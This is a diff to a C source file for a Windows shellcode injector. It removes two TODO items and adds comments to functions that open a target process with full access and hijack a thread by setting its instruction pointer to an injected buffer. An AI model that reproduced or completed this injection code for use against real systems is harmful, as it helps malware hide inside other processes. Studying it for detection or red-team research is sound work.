@@ -11,8 +11,6 @@
 //TODO:
 // - Implement Error Checking
 // - add x86 payloads
-// - CreateThread
-// - Thread Hijack
 // - Various APC
 // - memory map
 
@@ -93,6 +91,7 @@ BOOL createRemoteThreadInject(DWORD processId, HGLOBAL shellcode, const size_t s
 
 HANDLE getThread(DWORD pid) {
 	THREADENTRY32 threadEntry;
+	// needed for Thread32First function to iterate
 	threadEntry.dwSize = sizeof(THREADENTRY32);
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 
@@ -112,6 +111,7 @@ BOOL threadHijackInject(DWORD processId, HGLOBAL shellcode, const size_t shellco
 	BOOL bStatus;
 	DWORD status;
 	CONTEXT context;
+	// get all registers in thread context
 	context.ContextFlags = CONTEXT_FULL;
 
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
@@ -129,7 +129,7 @@ BOOL threadHijackInject(DWORD processId, HGLOBAL shellcode, const size_t shellco
 
 	// get thread context
 	bStatus = GetThreadContext(mainThread, &context);
-	// set new RIP address
+	// set new RIP (Instruction Pointer) address
 	context.Rip = (DWORD_PTR)rBuffer;
 	// set new thread context
 	bStatus = SetThreadContext(mainThread, &context);
